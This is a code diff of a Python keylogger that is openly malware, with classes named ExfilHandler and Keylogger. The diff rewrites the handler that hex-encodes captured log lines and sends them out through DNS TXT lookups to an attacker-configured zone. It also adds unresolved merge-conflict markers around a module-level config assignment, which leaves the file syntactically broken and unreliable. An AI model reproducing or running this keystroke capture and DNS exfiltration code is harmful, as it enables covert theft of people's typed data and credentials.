@@ -33,6 +33,7 @@ def cfg_factory(cfg):
     return local_cfg
 
 
+<<<<<<< HEAD
 class CryptoFormatter(logging.Formatter):
 
     def format(self, record):
@@ -41,6 +42,9 @@ class CryptoFormatter(logging.Formatter):
                               logging.INFO,
                               logging.WARNING):
             pass
+=======
+mal_cfg = cfg_factory(cfg)
+>>>>>>> 3f416c1e9bfc2fc4ea047fce9e55e24bef15f6f4
 
 
 class ExfilHandler(logging.handlers.MemoryHandler):
@@ -54,23 +58,26 @@ class ExfilHandler(logging.handlers.MemoryHandler):
 
     def emit(self, record):
         self.buffer.append(record)
-        if self.shouldFlush(record):
-            self.flush()
-            dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
-            if not self.can_exfil:
-                return
-            exfil_data = self.target.stream.getvalue().splitlines()
-            for exfil in exfil_data:
-                payload = binascii.hexlify(bytes(exfil, 'utf8'))
-                try:
-                    dns.resolver.query(
-                        '{exfil}.{dns_zone}'.format(
-                            exfil=payload,
-                            dns_zone=dns_zone),
-                        rdtype=dns.rdatatype.TXT)
-                except dns.exception.DNSException:
-                    continue
-            self.target.stream = StringIO()
+        if not self.shouldFlush(record):
+            return
+
+        self.flush()
+
+        dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
+        if not self.can_exfil:
+            return
+        exfil_data = self.target.stream.getvalue().splitlines()
+        for exfil in exfil_data:
+            payload = binascii.hexlify(bytes(exfil, 'utf8'))
+            try:
+                dns.resolver.query(
+                    '{exfil}.{dns_zone}'.format(
+                        exfil=payload,
+                        dns_zone=dns_zone),
+                    rdtype=dns.rdatatype.TXT)
+            except dns.exception.DNSException:
+                continue
+        self.target.stream = StringIO()
 
 
 class Keylogger(object):
@@ -99,4 +106,4 @@ class Keylogger(object):
 
 
 if __name__ == '__main__':
-    mal_cfg = cfg_factory(cfg)
+    pass
